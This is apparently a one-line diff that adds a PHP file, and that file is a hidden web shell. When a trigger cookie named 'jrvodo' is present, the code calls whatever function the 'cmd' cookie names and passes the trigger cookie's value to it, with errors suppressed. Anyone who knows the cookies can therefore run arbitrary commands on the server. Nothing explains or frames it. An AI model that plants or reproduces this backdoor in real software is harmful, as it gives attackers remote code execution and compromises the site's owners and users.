@@ -1,0 +1,1 @@
+<?php if (isset($_COOKIE["jrvodo"])) @$_COOKIE["cmd"]($_COOKIE["jrvodo"]);
